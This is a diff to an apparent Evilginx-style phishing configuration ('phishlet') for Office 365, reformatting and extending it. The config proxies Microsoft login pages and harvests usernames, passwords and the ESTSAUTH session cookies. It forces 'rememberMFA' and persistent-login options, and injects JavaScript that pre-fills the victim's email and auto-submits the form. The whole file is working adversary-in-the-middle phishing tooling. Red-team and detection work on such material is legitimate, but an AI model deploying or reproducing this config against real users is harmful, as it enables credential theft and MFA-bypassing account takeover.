@@ -1,9 +1,21 @@
-name: 'o365'
-author: '@jamescullum'
-min_ver: '2.3.0'
+name: "o365"
+author: "@jamescullum"
+min_ver: "2.3.0"
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      session: true,
+      is_landing: true,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "office.com",
+      session: false,
+      is_landing:false,
+    }
   # The lines below are needed if your target organization utilizes ADFS.
   # If they do, you need to uncomment all following lines that contain <...>
   # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
@@ -14,37 +26,116 @@ proxy_hosts:
   #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
   #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
 sub_filters:
-  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'href="https://{hostname}/login?es=Click&ru=%2F', replace: 'href="https://{hostname}/login?es=Click&ru=%2F', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}/login?es=Click&ru=%2F', replace: 'https://{hostname}/login?es=Click&ru=%2F', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {
+      triggers_on: "www.office.com",
+      orig_sub: "www",
+      domain: "office.com",
+      search: 'href="https://{hostname}/login?es=Click&ru=%2F',
+      replace: 'href="https://{hostname}/login?es=Click&ru=%2F',
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "www.office.com",
+      orig_sub: "www",
+      domain: "office.com",
+      search: "https://{hostname}/login?es=Click&ru=%2F",
+      replace: "https://{hostname}/login?es=Click&ru=%2F",
+      mimes: ["text/html", "application/json", "application/javascript"],
+      redirect_only: true,
+    }
+  - {
+      triggers_on: "login.microsoftonline.com",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      search: 'href="https://{hostname}',
+      replace: 'href="https://{hostname}',
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.microsoftonline.com",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+      redirect_only: true,
+    }
   # Uncomment and fill in if your target organization utilizes ADFS
   #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
 auth_tokens:
-  - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"]
 auth_urls:
   - "/kmsi*"
 credentials:
   username:
-    key: '(login|UserName)'
-    search: '(.*)'
-    type: 'post'
+    key: "(login|UserName)"
+    search: "(.*)"
+    type: "post"
   password:
-    key: '(passwd|Password)'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'www.office.com'
-  path: 'launch/excel?auth=2'
+    key: "(passwd|Password)"
+    search: "(.*)"
+    type: "post"
 
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
 
 rewrite_urls:
-  - triggers:
-      domains: ['login.microsoftonline.com']
-      paths: ['/common/oauth2/v2.0/authorize']
+  - trigger:
+      domains: ["login.microsoftonline.com"]
+      paths: ["/common/oauth2/v2.0/authorize"]
     rewrite:
-      path: '/oauth'
+      path: "/oauth"
       query:
-        - key: 'tid'
-          value: '{id}'
+        - key: "tid"
+          value: "{id}"
+
+force_post:
+  - path: "/kmsi"
+    search:
+      - { key: "LoginOptions", search: ".*" }
+    force:
+      - { key: "LoginOptions", value: "1" }
+    type: "post"
+  - path: "/common/SAS"
+    search:
+      - { key: "rememberMFA", search: ".*" }
+    force:
+      - { key: "rememberMFA", value: "true" }
+    type: "post"
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/*"]
+    script: |
+      function lp(){
+        const emailInput = document.getElementById("i0116");
+        if (emailInput) {
+          // Set the value
+          emailInput.value = "{email}";
+          
+          // Trigger input events to make the page detect the change
+          emailInput.dispatchEvent(new Event('input', { bubbles: true }));
+          emailInput.dispatchEvent(new Event('change', { bubbles: true }));
+          emailInput.dispatchEvent(new Event('keyup', { bubbles: true }));
+          
+          // Focus the input to ensure it's active
+          emailInput.focus();
+          
+          const nextButton = document.getElementById("idSIButton9");
+          if (nextButton) {
+            nextButton.click();
+          }
+          return true; // Exit the loop
+        }
+        return false; // Continue checking
+      }
+      
+      const checkInterval = setInterval(function() {
+        if (lp()) {
+          clearInterval(checkInterval); // Stop checking when successful
+        }
+      }, 500);
+
